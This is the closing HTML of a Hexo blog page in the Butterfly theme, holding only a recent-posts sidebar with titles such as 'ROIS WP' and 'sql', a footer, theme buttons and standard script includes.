class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/01/31/ROISWP/" title="ROIS WP">ROIS WP</a><time datetime="2023-01-31T05:14:00.000Z" title="Created 2023-01-31 13:14:00">2023-01-31</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/05/13/searching/" title="searchinging">searchinging</a><time datetime="2022-05-13T08:24:44.000Z" title="Created 2022-05-13 16:24:44">2022-05-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/03/03/java/" title="java">java</a><time datetime="2022-03-03T11:13:52.000Z" title="Created 2022-03-03 19:13:52">2022-03-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/02/13/exercise/" title="exercise">exercise</a><time datetime="2022-02-13T12:55:31.000Z" title="Created 2022-02-13 20:55:31">2022-02-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/01/13/sql/" title="sql">sql</a><time datetime="2022-01-13T06:29:08.000Z" title="Created 2022-01-13 14:29:08">2022-01-13</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By John Doe</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
